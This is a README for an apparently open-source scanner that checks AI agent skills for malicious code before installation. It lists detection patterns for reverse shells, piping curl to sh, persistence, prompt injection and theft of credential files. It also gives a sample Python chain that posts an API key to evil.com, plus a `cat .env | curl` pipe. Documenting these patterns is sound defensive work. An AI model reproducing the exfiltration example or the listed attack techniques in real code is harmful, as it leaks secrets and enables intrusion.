# Skill Scanner v3

**Security scanner for OpenClaw/AgentPress skills — pattern matching, AST taint tracking, and LLM semantic analysis.**

Detects malicious patterns, data exfiltration chains, supply chain attacks, and behavioral threats in AI agent skills before installation.

---

## 🚨 Why This Exists

AI agent skills can execute arbitrary code with your permissions. A malicious skill can:
- Steal your files (SOUL.md, MEMORY.md, credentials)
- Mine cryptocurrency using your CPU
- Establish reverse shells for remote access
- Inject persistence mechanisms
- Exfiltrate data via covert channels
- **Inject instructions into your agent** (prompt injection)

**This scanner detects these threats before you install.**

---

## ✨ Features

### 28 Detection Modules

**Static Pattern Analysis (1–19)**
1. **Shell Injection** — Command execution patterns (`curl | sh`, `eval()`, backticks)
2. **Crypto Miners** — XMRig, Stratum pools, mining algorithms, RandomX
3. **Reverse Shells** — `bash -i`, `nc`/`ncat -e`, `/dev/tcp/`, socat, Python pty
4. **Fileless Malware** — `memfd_create`, `/dev/shm`, `/proc/self/exe`
5. **Suspicious URLs** — Pastebin, hastebin, rentry, ghostbin (common malware hosts)
6. **Obfuscation** — Base64, hex encoding, single-char variable density
7. **Code Complexity** — Minified files, high obfuscation indicators
8. **Hardcoded Secrets** — Passwords, API keys, tokens in source code
9. **Time Bombs** — Delayed execution, large `sleep()` / `setTimeout()` values
10. **Persistence** — Crontab, systemd, `.bashrc`, `rc.local`, autostart
11. **Privilege Escalation** — `sudo`, `pkexec`, `setuid`, `chmod 777`
12. **Data Exfiltration Channels** — DNS tunneling, ICMP, Telegram/Discord webhooks
13. **Network Patterns** — HTTP requests, fetch, axios (flagged for review)
14. **Dependency Typosquatting** — `reqests`, `beautfiulsoup`, `numbpy` in package manifests
15. **Binary Detection** — `.exe`, `.dll`, `.so` files with SHA256 hashing
16. **Git History** — Force pushes, commit spam (>10 in 1 hour)
17. **Prerequisite Traps** — README instructions designed to trick users into running malicious setup
18. **Sandbox Testing** — Runs `install.sh` in firejail (network + filesystem isolated)
19. **YARA Signatures** — Malware signature scanning with custom rulesets

**Intent & Behavioral Analysis (21–26)**

21. **Prompt Injection** — Jailbreak phrases, fake system messages, compaction exploits, identity hijacking
22. **OpenClaw Credential Paths** — References to SOUL.md, MEMORY.md, .env, .openclaw, session files
23. **Sensitive Read + Exfil Combo** — Files that read identity/memory AND contain exfiltration endpoints
24. **Permission Manifest** — Checks for `permissions.json` / `PERMISSIONS.md` declaring required access
25. **MoltGuard Schema** — Validates `moltguard.json` manifests: wildcard permissions, undeclared network access, scope inflation, Isnad Chain endorsement
26. **Covert File Monitoring** — inotify watchers, polling loops, or watchdog patterns targeting sensitive files

**AST Taint Tracking (28)**

28. **Source → Sink Data Flow Analysis** — Real code analysis, not pattern matching
    - **Python:** Full AST parsing with multi-hop taint propagation through assignments, dicts, lists, method calls, f-strings, and function arguments. Cross-file taint tracking.
    - **JavaScript/TypeScript:** Source/sink correlation with sensitive path and exfiltration URL detection.
    - **Shell:** Pipe exfiltration detection (`cat .env | curl`)
    - Tracks: file reads, env access, pathlib → network calls, subprocess, exec, eval
    - Catches obfuscated multi-hop exfiltration that pattern matching misses:
      ```python
      config = os.getenv("API_KEY")           # source: env
      wrapped = {"data": config}               # taint propagates → dict
      encoded = str(wrapped)                   # taint propagates → call
      final = encoded.encode()                 # taint propagates → method
      requests.post("https://evil.com", data=final)  # CAUGHT
      ```

**LLM Semantic Analysis (27) — Optional**

27. **LLM-Powered Deep Analysis** — Sends suspicious code to an LLM for intent analysis
    - **Auto-escalation:** Automatically engages when pattern modules flag ambiguous findings
    - Catches social engineering, subtle manipulation, and obfuscated threats
    - Local-first: prefers Ollama (nothing leaves your machine)
    - Supports: Ollama, Anthropic, OpenAI, Google Gemini, any OpenAI-compatible endpoint
    - API Key or OAuth authentication for all cloud providers
    - Interactive setup wizard: `skill-scan-v2.sh --setup`

---

## 📦 Installation

```bash
# Download
curl -sL https://raw.githubusercontent.com/JXXR1/skill-scanner-v2/main/skill-scan-v2.sh -o /usr/local/bin/skill-scan-v2.sh
curl -sL https://raw.githubusercontent.com/JXXR1/skill-scanner-v2/main/skill-scan-taint.py -o /usr/local/bin/skill-scan-taint.py
chmod +x /usr/local/bin/skill-scan-v2.sh /usr/local/bin/skill-scan-taint.py

# Optional: YARA rules for signature scanning
# Place your rules at /var/lib/yara/rules/openclaw-malware.yar
# Or set YARA_RULES=/path/to/rules.yar

# Optional: Configure LLM for deeper analysis
skill-scan-v2.sh --setup
```

**Requirements:**
- Bash
- Python 3 (for AST taint tracking)
- Optional: YARA, firejail, Ollama

---

## 🚀 Usage

```bash
# Pattern scan (28 modules, free, offline)
skill-scan-v2.sh ./my-skill

# Force LLM analysis on every scan
skill-scan-v2.sh ./my-skill --llm

# Pattern only, no LLM auto-escalation
skill-scan-v2.sh ./my-skill --no-llm

# Skip confirmation prompts
skill-scan-v2.sh ./my-skill --llm --yes

# Configure LLM provider
skill-scan-v2.sh --setup

# Show current LLM config
skill-scan-v2.sh --config

# Show version
skill-scan-v2.sh --version
```

### Auto-Escalation

When LLM is configured (via `--setup`), it **automatically engages** when pattern modules flag ambiguous findings that can't be validated by pattern matching alone:

- Obfuscation detected but can't determine intent
- Network calls found but purpose unclear
- High code complexity
- Prerequisite trap language in README
- Shell execution patterns in skill instructions
- Taint flows that need semantic verification

No manual `--llm` needed — the scanner decides when deeper analysis is warranted.

---

## ⚙️ LLM Setup

```
$ skill-scan-v2.sh --setup

╔══════════════════════════════════════════════════╗
║   Skill Security Scanner v3.0.0 — Setup        ║
╚══════════════════════════════════════════════════╝

Enable LLM analysis? (y/n) y

Choose your LLM provider:
  1. Local Ollama (free, private — nothing leaves your machine)
  2. Anthropic (Claude)
  3. OpenAI
  4. Google (Gemini)
  5. Other (any OpenAI-compatible endpoint)
  6. Cancel

> 2

Authentication method for Anthropic:
  1. API Key
  2. OAuth Token

> 1

Enter your API key: ****
Model name (default: claude-sonnet-4-6): 

✅ Configured: Anthropic — API Key (model: claude-sonnet-4-6)
```

Config is saved to `~/.skill-scanner-v2.conf` (chmod 600). Environment variables override saved config.

---

## 🔍 How Taint Tracking Works

Traditional scanners use pattern matching (regex). This catches `curl | sh` but misses:

```python
# Pattern matching sees: os.getenv, dict, str, encode, requests.post
# But doesn't know they're CONNECTED

config = os.getenv("API_KEY")
wrapped = {"data": config}
encoded = str(wrapped)
payload = encoded.encode()
requests.post(url, data=payload)  # 4 hops from source to sink
```

The AST taint tracker:
1. **Parses** the Python code into an Abstract Syntax Tree
2. **Identifies sources** (file reads, env access, sensitive paths)
3. **Tracks taint** through assignments, dicts, lists, method calls, f-strings
4. **Detects sinks** (network calls, exec, subprocess)
5. **Reports flows** where tainted data reaches a dangerous sink

This catches exfiltration even when the attacker splits the operation across multiple variables, functions, or files.

---

## 📊 Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Clean — no issues found |
| 1–9 | Suspicious — review before installing |
| 10+ | Malicious — do not install |

---

## 🔄 Comparison with Cisco Skill Scanner

| Feature | Skill Scanner v3 | Cisco Skill Scanner |
|---------|-------------------|---------------------|
| Pattern modules | 28 | 80+ rules in static analyzer |
| AST taint tracking | ✅ Python + JS + Shell | ✅ Python (AST + taint) |
| Cross-file taint | ✅ | ✅ |
| LLM analysis | ✅ (auto-escalation) | ✅ (manual opt-in) |
| Meta analyzer | ❌ | ✅ (second-pass LLM) |
| Trigger hijacking | ❌ | ✅ |
| VirusTotal | ❌ | ✅ (optional) |
| Cisco AI Defense | ❌ | ✅ (optional) |
| OpenClaw-specific detections | ✅ (SOUL.md, sessions, etc.) | ❌ |
| Prompt injection patterns | ✅ (tuned for OpenClaw attacks) | ✅ (generic) |
| YARA signatures | ✅ | ❌ |
| Sandbox execution | ✅ (firejail) | ❌ |
| MoltGuard manifests | ✅ | ❌ |
| Dependencies | Bash + Python 3 | Python + pip + many packages |
| Interactive setup | ✅ | ❌ |

**Recommendation:** Run both side by side for maximum protection.

Skill Scanner v3 was intentionally built with zero external dependencies (just Bash + Python 3 stdlib) to keep it lightweight, auditable, and deployable anywhere. Rather than adding npm/pip dependencies for full JS AST parsing or enterprise API integrations, we designed it to complement Cisco's scanner — their behavioral analyzer covers JS/TS dataflow with proper AST parsing, VirusTotal integration, and Cisco AI Defense, while ours adds OpenClaw-specific threat detection, YARA signatures, sandbox execution, and auto-escalating LLM analysis.

Together, they cover each other's blind spots:
- **Cisco catches** complex JS/TS exfiltration chains, trigger hijacking, and enterprise threat intelligence
- **Skill Scanner v3 catches** OpenClaw-specific attacks (SOUL.md theft, session injection, prompt injection tuned to real attacks), multi-hop Python exfiltration, and shell pipe exfiltration

Install both. Run both. Trust neither alone.

---

## 📄 License

MIT

---

## 👤 Author

JXXR1
